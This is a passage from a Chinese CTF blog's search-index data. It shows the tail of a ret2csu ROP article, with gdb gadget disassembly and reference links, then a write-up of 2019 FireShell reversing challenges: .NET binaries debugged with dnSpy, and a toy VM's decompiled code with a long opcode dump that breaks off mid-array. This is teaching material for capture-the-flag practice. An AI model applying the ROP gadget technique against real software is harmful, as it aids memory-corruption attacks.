&lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret assassinq&gt;&gt; x/5i 0x000000000040061E 0x40061e &lt;__libc_csu_init+94&gt;: pop r13 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x000000000040061F 0x40061f &lt;__libc_csu_init+95&gt;: pop rbp 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nopassassinq&gt;&gt; x/5i 0x0000000000400620 0x400620 &lt;__libc_csu_init+96&gt;: pop r14 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400621 0x400621 &lt;__libc_csu_init+97&gt;: pop rsi 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0]assassinq&gt;&gt; x/5i 0x0000000000400622 0x400622 &lt;__libc_csu_init+98&gt;: pop r15 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz ret assassinq&gt;&gt; x/5i 0x0000000000400623 0x400623 &lt;__libc_csu_init+99&gt;: pop rdi 0x400624 &lt;__libc_csu_init+100&gt;: ret 0x400625: nop 0x400626: nop WORD PTR cs:[rax+rax*1+0x0] 0x400630 &lt;__libc_csu_fini&gt;: repz retassassinq&gt;&gt; quit 参考网站https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csuhttps://chybeta.github.io/2017/08/09/ROP%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%88%A9%E7%94%A8%E9%80%9A%E7%94%A8gadget/https://raw.githubusercontent.com/zhengmin1989/MyArticles/master/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.htmlhttps://www.jianshu.com/p/73fff078c19chttps://www.jianshu.com/p/a32dc72bb20f","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"2019-FireShell-review","slug":"【未完成】2019-FireShell-review","date":"2019-01-30T04:51:13.000Z","updated":"2019-02-01T12:08:18.439Z","comments":true,"path":"2019/01/30/【未完成】2019-FireShell-review/","link":"","permalink":"https://qianfei11.github.io/2019/01/30/【未完成】2019-FireShell-review/","excerpt":"比赛没打，当作练习以及看着大佬的writeup复现了一下几道二进制。","text":"比赛没打，当作练习以及看着大佬的writeup复现了一下几道二进制。 REBlackbox-0先file一下： 12$ file Blackbox-0.exe Blackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows 运行程序： 1234This binary is a black box.This means that it was designed to be analyzed without looking it&apos;s inside contentsYou will solve the chalenge by letting the flag to be outputted in some way.You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment. 是.NET程序，故使用dnSpy来调试。在单步时，发现\\u000F\\u2009第354行返回一个变量text。 在这里设下断点，并多次继续后会得到一串base64，解密得到flag： Blackbox-1file一下： 12$ file Blackbox-1.exe Blackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows 运行程序没有任何输出。同样因为是.NET程序，使用dnSpy调试。在\\u000F\\u2009第358行返回一个变量text： 在此处设置断点并多次继续，text的值会变成flag： babyvm一道简单虚拟机。运行一下出现Program executed successfully!。先拖进ida查看main函数： 12345678910__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; while ( (_BYTE)end_sign ) &#123; get_option(); vm_start(); ++j; &#125; return 0LL;&#125; 第一个函数获取一个option，然后进入vm_start()执行指令： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int vm_start()&#123; void *__ptr32 *v0; // rax int v1; // eax int v2; // ST34_4 int v3; // eax int v4; // ST3C_4 int v5; // eax int v6; // ST28_4 int v7; // eax int v8; // ST30_4 int v9; // eax int v10; // ST1C_4 int v11; // eax int v12; // ST24_4 int v13; // eax int v14; // ST10_4 int v15; // eax int v16; // ST18_4 __int64 savedregs; // [rsp+40h] [rbp+0h] v0 = off_33D0; switch ( (unsigned int)&amp;savedregs ) &#123; case 0u: ++i; ++j; v0 = (void *__ptr32 *)buf; buf[i] = code[j]; break; case 1u: v1 = i--; v2 = buf[v1]; v3 = i--; v4 = buf[v3] + v2; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v4; break; case 3u: LOBYTE(end_sign) = 0; LODWORD(v0) = puts(\"Program executed successfully!\"); break; case 4u: v5 = i--; v6 = buf[v5]; v7 = i--; v8 = v6 * buf[v7]; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v8; break; case 5u: v9 = i--; v10 = buf[v9]; v11 = i--; v12 = buf[v11] / v10; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v12; break; case 6u: v13 = i--; v14 = buf[v13]; v15 = i--; v16 = buf[v15] - v14; ++i; v0 = (void *__ptr32 *)buf; buf[i] = v16; break; default: return (signed int)v0; &#125; return (signed int)v0;&#125; 可以发现程序执行了内部的指令，没有任何与指令有关的输出。只管把指令dump出来，再把switch写出来复现一下： 12345678910111213141516171819202122232425262728293031323334353637383940code = [0x00000000, 0x00000046, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000343, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000016D5, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000016D5, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000059, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x0000CD7D, 0x00000000, 0x00000024, 0x00000001, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CD5B, 0x00000006, 0x00000002, 0x00000000, 0x0000CDA1, 0x00000000, 0x0000CDA1, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000038, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000043, 0x00000006, 0x00000000, 0x00000023, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000000F5, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000149, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000066D, 0x00000000, 0x0000003E, 0x00000001, 0x00000000, 0x000006AB, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000705, 0x00000000, 0x00000026, 0x00000006, 0x00000000, 0x00000705, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000E0A, 0x00000000, 0x00000009, 0x00000006, 0x00000000, 0x00000E0A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00008C64, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00034A58, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00170868, 0x00000000, 0x00000032, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000002, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000010, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x00170868, 0x00000000, 0x00170845, 0x00000006, 0x00000002, 0x00000000, 0x00170868, 0x00000000, 0x00170868, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x0000003F, 0x00000006, 0x00000000, 0x0000007B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000006, 0x00000000, 0x00000171, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000005C4, 0x00000000, 0x00000029, 0x00000001, 0x00000000, 0x000005ED, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000005ED, 0x00000000, 0x0000000C, 0x00000001, 0x00000000, 0x000005F9, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002FC8, 0x00000000, 0x00000050, 0x00000001, 0x00000000, 0x00003018, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C060, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x0000C085, 0x00000000, 0x00000023, 0x00000006, 0x00000000, 0x0000C085, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0001810A, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x000F0A64, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001E14C8, 0x00000000, 0x0000001C, 0x00000001, 0x00000000, 0x001E14E4, 0x00000000, 0x001E1469, 0x00000006, 0x00000002, 0x00000000, 0x001E14E4, 0x00000000, 0x001E14E4, 0x00000006, 0x00000000, 0x00000043, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000014F, 0x00000000, 0x00000018, 0x00000006, 0x00000000, 0x0000014F, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000007DA, 0x00000000, 0x00000051, 0x00000001, 0x00000000, 0x0000082B, 0x00000000, 0x0000004F, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x0000082B, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00004158, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000033, 0x00000006, 0x00000000, 0x00004158, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00004159, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x000041A6, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000189E4, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC4F9, 0x00000006, 0x00000002, 0x00000000, 0x000AC53C, 0x00000000, 0x000AC53C, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000075, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00000249, 0x00000000, 0x00000047, 0x00000001, 0x00000000, 0x00000290, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x000002A2, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x000002A2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x000017B2, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x000017B2, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00001813, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00003026, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00003026, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0000C098, 0x00000000, 0x00000045, 0x00000006, 0x00000000, 0x0000C098, 0x00000000, 0x00000052, 0x00000001, 0x00000000, 0x0000C0EA, 0x00000000, 0x00000037, 0x00000001, 0x00000000, 0x0000C121, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00030484, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00121B18, 0x00000000, 0x00121AA3, 0x00000006, 0x00000002, 0x00000000, 0x00121B18, 0x00000000, 0x00121B18, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000039, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00000046, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000008C, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000003D4, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x0000002D, 0x00000006, 0x00000000, 0x000003D4, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x000016F8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000016F8, 0x00000000, 0x00000003, 0x00000001, 0x00000000, 0x000016FB, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00002DF6, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x00002E56, 0x00000000, 0x0000005F, 0x00000001, 0x00000000, 0x00002EB5, 0x00000000, 0x00000013, 0x00000001, 0x00000000, 0x00002EC8, 0x00000000, 0x0000002F, 0x00000001, 0x00000000, 0x00002EF7, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0001A6AF, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0001A6C7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x0001A700, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0001A743, 0x00000000, 0x0001A70E, 0x00000006, 0x00000002, 0x00000000, 0x0001A743, 0x00000000, 0x0001A743, 0x00000006, 0x00000000, 0x00000074, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00000099, 0x00000000, 0x00000053, 0x00000006, 0x00000000, 0x00000099, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000561, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x000005C4, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00002E20, 0x00000000, 0x00000025, 0x00000001, 0x00000000, 0x00002E45, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00002E45, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00002E99, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0000E8FD, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x0000E939, 0x00000000, 0x00000040, 0x00000006, 0x00000000, 0x0000E939, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00048E1D, 0x00000000, 0x0000001F, 0x00000001, 0x00000000, 0x00048E3C, 0x00000000, 0x00000036, 0x00000001, 0x00000000, 0x00048E72, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00091CE4, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x001239C8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x001239C8, 0x00000000, 0x00123954, 0x00000006, 0x00000002, 0x00000000, 0x001239C8, 0x00000000, 0x001239C8, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000040, 0x00000006, 0x00000000, 0x00000030, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x00000064, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00000320, 0x00000000, 0x00000047, 0x00000006, 0x00000000, 0x00000320, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x00000324, 0x00000000, 0x00000014, 0x00000001, 0x00000000, 0x00000338, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x00000338, 0x00000000, 0x00000044, 0x00000001, 0x00000000, 0x0000037C, 0x00000000, 0x0000005E, 0x00000001, 0x00000000, 0x000003DA, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00002684, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00009A10, 0x00000000, 0x0000000A, 0x00000001, 0x00000000, 0x00009A1A, 0x00000000, 0x0000001D, 0x00000001, 0x00000000, 0x00009A37, 0x00000000, 0x00000008, 0x00000001, 0x00000000, 0x00009A3F, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0004D1F8, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0009A3F0, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x0009A400, 0x00000000, 0x0000003B, 0x00000006, 0x00000000, 0x0009A400, 0x00000000, 0x0009A3D0, 0x00000006, 0x00000002, 0x00000000, 0x0009A400, 0x00000000, 0x0009A400, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x0000007D, 0x00000000, 0x0000000F, 0x00000001, 0x00000000, 0x0000008C, 0x00000000, 0x00000001, 0x00000006, 0x00000000, 0x0000008C, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x000000C8, 0x00000000, 0x00000050, 0x00000006, 0x00000000, 0x000000C8, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00000129, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000A71, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000029C4, 0x00000000, 0x00000047, 0x00000006, 0x00000000, 0x000029C4, 0x00000000, 0x0000001E, 0x00000001, 0x00000000, 0x000029E2, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00007DA6, 0x00000000, 0x0000005F, 0x00000006, 0x00000000, 0x00007DA6, 0x00000000, 0x00000058, 0x00000001, 0x00000000, 0x00007DFE, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x000371F2, 0x00000000, 0x00000007, 0x00000001, 0x00000000, 0x000371F9, 0x00000000, 0x0000001B, 0x00000006, 0x00000000, 0x000371F9, 0x00000000, 0x00000017, 0x00000001, 0x00000000, 0x00037210, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00037211, 0x00000000, 0x000371A4, 0x00000006, 0x00000002, 0x00000000, 0x00037211, 0x00000000, 0x00037211, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000005F, 0x00000000, 0x0000003F, 0x00000001, 0x00000000, 0x0000009E, 0x00000000, 0x00000052, 0x00000006, 0x00000000, 0x0000009E, 0x00000000, 0x0000004A, 0x00000006, 0x00000000, 0x0000009E, 0x00000000, 0x0000002B, 0x00000001, 0x00000000, 0x000000C9, 0x00000000, 0x0000001F, 0x00000001, 0x00000000, 0x000000E8, 0x00000000, 0x0000004D, 0x00000006, 0x00000000, 0x000000E8, 0x00000000, 0x00000055, 0x00000006, 0x00000000, 0x000000E8, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00000658, 0x00000000, 0x00000030, 0x00000006, 0x00000000, 0x00000658, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00003918, 0x00000000, 0x00000048, 0x00000006, 0x00000000, 0x00003918, 0x00000000, 0x00000043, 0x00000001, 0x00000000, 0x0000395B, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000AC11, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000AC11, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x0002B044, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0002B044, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0012D1DC, 0x00000000, 0x0012D17D, 0x00000006, 0x00000002, 0x00000000, 0x0012D1DC, 0x00000000, 0x0012D1DC, 0x00000006, 0x00000000, 0x00000076, 0x00000000, 0x00000031, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000058, 0x00000001, 0x00000000, 0x000000FF, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x000003FC, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000013EC, 0x00000000, 0x00000006, 0x00000001, 0x00000000, 0x000013F2, 0x00000000, 0x0000001D, 0x00000006, 0x00000000, 0x000013F2, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x000013F2, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x0000B382, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0004E88E, 0x00000000, 0x00000056, 0x00000006, 0x00000000, 0x0004E88E, 0x00000000, 0x00000034, 0x00000001, 0x00000000, 0x0004E8C2, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00225D4E, 0x00000000, 0x00225CD8, 0x00000006, 0x00000002, 0x00000000, 0x00225D4E, 0x00000000, 0x00225D4E, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x00000060, 0x00000006, 0x00000000, 0x0000006D, 0x00000000, 0x0000000D, 0x00000001, 0x00000000, 0x0000007A, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x00000356, 0x00000000, 0x00000019, 0x00000006, 0x00000000, 0x00000356, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x00000356, 0x00000000, 0x00000018, 0x00000001, 0x00000000, 0x0000036E, 0x00000000, 0x00000040, 0x00000001, 0x00000000, 0x000003AE, 0x00000000, 0x0000000A, 0x00000001, 0x00000000, 0x000003B8, 0x00000000, 0x00000022, 0x00000006, 0x00000000, 0x000003B8, 0x00000000, 0x0000005A, 0x00000006, 0x00000000, 0x000003B8, 0x00000000, 0x00000063, 0x00000001, 0x00000000, 0x0000041B, 0x00000000, 0x000003AE, 0x00000006, 0x00000002, 0x00000000, 0x0000041B, 0x00000000, 0x0000041B, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000061, 0x00000001, 0x00000000, 0x00000096, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00000384, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x00001518, 0x00000000, 0x00000010, 0x00000001, 0x00000000, 0x00001528, 0x00000000, 0x00000027, 0x00000006, 0x00000000, 0x00001528, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x0000A940, 0x00000000, 0x0000005D, 0x00000001, 0x00000000, 0x0000A99D, 0x00000000, 0x0000000B, 0x00000001, 0x00000000, 0x0000A9A8, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0006A090, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0013E1B0, 0x00000000, 0x0000000E, 0x00000001, 0x00000000, 0x0013E1BE, 0x00000000, 0x0013E189, 0x00000006, 0x00000002, 0x00000000, 0x0013E1BE, 0x00000000, 0x0013E1BE, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000048, 0x00000001, 0x00000000, 0x000000A7, 0x00000000, 0x00000003, 0x00000006, 0x00000000, 0x000000A7, 0x00000000, 0x00000039, 0x00000001, 0x00000000, 0x000000E0, 0x00000000, 0x00000017, 0x00000001, 0x00000000, 0x000000F7, 0x00000000, 0x00000020, 0x00000006, 0x00000000, 0x000000F7, 0x00000000, 0x0000004E, 0x00000001, 0x00000000, 0x00000145, 0x00000000, 0x0000003C, 0x00000001, 0x00000000, 0x00000181, 0x00000000, 0x00000008, 0x00000006, 0x00000000, 0x00000181, 0x00000000, 0x00000027, 0x00000001, 0x00000000, 0x000001A8, 0x00000000, 0x00000035, 0x00000001, 0x00000000, 0x000001DD, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x000001E1, 0x00000000, 0x0000003A, 0x00000006, 0x00000000, 0x000001E1, 0x00000000, 0x00000057, 0x00000001, 0x00000000, 0x00000238, 0x00000000, 0x0000005A, 0x00000001, 0x00000000, 0x00000292, 0x00000000, 0x0000000A, 0x00000006, 0x00000000, 0x00000292, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x000007B6, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00004D1C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00004D1C, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00009A38, 0x00000000, 0x000099D9, 0x00000006, 0x00000002, 0x00000000, 0x00009A38, 0x00000000, 0x00009A38, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x0000003D, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000014, 0x00000006, 0x00000000, 0x00000061, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00000123, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000036, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x00000123, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00000A3B, 0x00000000, 0x0000005A, 0x00000006, 0x00000000, 0x00000A3B, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x00003327, 0x00000000, 0x00000012, 0x00000001, 0x00000000, 0x00003339, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x0002003A, 0x00000000, 0x0000003F, 0x00000001, 0x00000000, 0x00020079, 0x00000000, 0x00000009, 0x00000004, 0x00000000, 0x00120441, 0x00000000, 0x00000041, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x0000002C, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x00000021, 0x00000006, 0x00000000, 0x00120441, 0x00000000, 0x00000006, 0x00000004, 0x00000000, 0x006C1986, 0x00000000, 0x00000033, 0x00000001, 0x00000000, 0x006C19B9, 0x00000000, 0x006C1958, 0x00000006, 0x00000002, 0x00000000, 0x006C19B9, 0x00000000, 0x006C19B9, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000063, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000007, 0x00000004, 0x00000000, 0x0000031E, 0x00000000, 0x0000000A, 0x00000004, 0x00000000, 0x00001F2C, 0x00000000, 0x00000027, 0x00000006, 0x00000000, 0x00001F2C, 0x00000000, 0x0000003C, 0x00000006, 0x00000000, 0x00001F2C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00001F2C, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00005D84, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x0001D394, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x0001D394, 0x00000000, 0x00000021, 0x00000001, 0x00000000, 0x0001D3B5, 0x00000000, 0x00000006, 0x00000006, 0x00000000, 0x0001D3B5, 0x00000000, 0x0000005C, 0x00000001, 0x00000000, 0x0001D411, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00075044, 0x00000000, 0x00000011, 0x00000001, 0x00000000, 0x00075055, 0x00000000, 0x0000003A, 0x00000001, 0x00000000, 0x0007508F, 0x00000000, 0x00000060, 0x00000001, 0x00000000, 0x000750EF, 0x00000000, 0x0007507D, 0x00000006, 0x00000002, 0x00000000, 0x000750EF, 0x00000000, 0x000750EF, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x0000000F, 0x00000006, 0x00000000, 0x00000033, 0x00000000, 0x00000032, 0x00000001, 0x00000000, 0x00000065, 0x00000000, 0x00000023, 0x00000001, 0x00000000, 0x00000088, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x00000110, 0x00000000, 0x0000005B, 0x00000006, 0x00000000, 0x00000110, 0x00000000, 0x00000001, 0x00000001, 0x00000000, 0x00000111, 0x00000000, 0x0000004A, 0x00000006, 0x00000000, 0x00000111, 0x00000000, 0x00000034, 0x00000006, 0x00000000, 0x00000111, 0x00000000, 0x00000020, 0x00000001, 0x00000000, 0x00000131, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x00000185, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x00000185, 0x00000000, 0x00000152, 0x00000006, 0x00000002, 0x00000000, 0x00000185, 0x00000000, 0x00000185, 0x00000006, 0x00000000, 0x0000005F, 0x00000000, 0x00000054, 0x00000001, 0x00000000, 0x000000B3, 0x00000000, 0x0000004D, 0x00000001, 0x00000000, 0x00000100, 0x00000000, 0x00000059, 0x00000001, 0x00000000, 0x00000159, 0x00000000, 0x00000004, 0x00000001, 0x00000000, 0x0000015D, 0x00000000, 0x00000022, 0x00000006, 0x00000000, 0x0000015D, 0x00000000, 0x00000004, 0x00000004, 0x00000000, 0x00000574, 0x00000000, 0x00000014, 0x00000006, 0x00000000, 0x00000574, 0x00000000, 0x0000005D, 0x00000006, 0x00000000, 0x00000574, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x0000105C, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x0000105C, 0x00000000, 0x00000FFD, 0x00000006, 0x00000002, 0x00000000, 0x0000105C, 0x00000000, 0x0000105C, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x0000001C, 0x00000006, 0x00000000, 0x00000072, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x00000072, 0x00000000, 0x0000004A, 0x00000001, 0x00000000, 0x000000BC, 0x00000000, 0x00000054, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000000BC, 0x00000000, 0x00000049, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x0000002E, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000007, 0x00000006, 0x00000000, 0x000000BC, 0x00000000, 0x00000005, 0x00000004, 0x00000000, 0x000003AC, 0x00000000, 0x00000051, 0x00000006, 0x00000000, 0x000003AC, 0x00000000, 0x00000001, 0x00000004, 0x00000000, 0x000003AC, 0x00000000, 0x0000005C, 0x00000006, 0x00000000, 0x000003AC, 0x00000000, 0x00000008, 0x00000004, 0x00000000, 0x00001D60, 0x00000000, 0x00000003, 0x00000004, 0x00000000, 0x00005820, 0x00000000, 0x0000001F, 0x00000006, 0x00000000, 0x00005820, 0x00000000, 0x00000053, 0x00000001, 0x00000000, 0x00005873, 0x00000000, 0x00000002, 0x00000004, 0x00000000, 0x0000B0E6, 0x00000000, 